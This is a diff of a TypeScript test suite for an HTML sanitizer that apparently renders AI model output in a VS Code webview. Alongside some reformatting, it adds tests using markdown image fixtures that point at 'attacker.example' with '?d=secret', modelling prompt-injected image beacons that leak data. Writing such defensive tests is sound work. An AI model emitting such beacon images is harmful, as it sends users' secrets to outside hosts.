@@ -63,9 +63,9 @@ describe('VSCODE-05 — sanitizeHtml (command: URI and javascript: stripping in 
     expect(parse('[m](mailto:user@example.com)').querySelector('a')?.getAttribute('href')).toBe(
       'mailto:user@example.com',
     );
-    expect(
-      parse('see https://example.com/path now').querySelector('a')?.getAttribute('href'),
-    ).toBe('https://example.com/path');
+    expect(parse('see https://example.com/path now').querySelector('a')?.getAttribute('href')).toBe(
+      'https://example.com/path',
+    );
   });
 
   it('forces every surviving link to open outside the webview with no opener', () => {
@@ -78,10 +78,7 @@ describe('VSCODE-05 — sanitizeHtml (command: URI and javascript: stripping in 
   it('keeps code-block actions as buttons that cannot submit', () => {
     const buttons = parse('```ts\nconst x = 1;\n```').querySelectorAll('button');
 
-    expect([...buttons].map((button) => button.getAttribute('type'))).toEqual([
-      'button',
-      'button',
-    ]);
+    expect([...buttons].map((button) => button.getAttribute('type'))).toEqual(['button', 'button']);
   });
 
   it('escapes raw HTML in model output instead of rendering it', () => {
@@ -96,8 +93,27 @@ describe('VSCODE-05 — sanitizeHtml (command: URI and javascript: stripping in 
     }
   });
 
+  it('drops markdown image syntax so a prompt-injected transcript cannot beacon out', () => {
+    const doc = parse('![beacon](https://attacker.example/p.png?d=secret)');
+
+    expect(doc.querySelector('img')).toBeNull();
+    expect(doc.body.innerHTML).not.toContain('attacker.example');
+  });
+
+  it('drops a reference-style image and a linked image the same way', () => {
+    const reference = parse('![b][ref]\n\n[ref]: https://attacker.example/r.png?d=secret');
+    expect(reference.querySelector('img')).toBeNull();
+    expect(reference.body.innerHTML).not.toContain('attacker.example');
+
+    const linked = parse('[![b](https://attacker.example/i.png?d=secret)](https://example.com)');
+    expect(linked.querySelector('img')).toBeNull();
+    expect(linked.body.innerHTML).not.toContain('attacker.example');
+  });
+
   it('drops every forbidden tag, including the six DOMPurify would otherwise keep', () => {
     for (const tag of [
+      'img',
+      'picture',
       'svg',
       'math',
       'audio',
@@ -129,8 +145,8 @@ describe('VSCODE-05 — sanitizeHtml (command: URI and javascript: stripping in 
   });
 
   it('refuses data attributes so nothing smuggles state into the webview DOM', () => {
-    expect(sanitize('<p data-secret="x">y</p>').querySelector('p')?.hasAttribute('data-secret')).toBe(
-      false,
-    );
+    expect(
+      sanitize('<p data-secret="x">y</p>').querySelector('p')?.hasAttribute('data-secret'),
+    ).toBe(false);
   });
 });
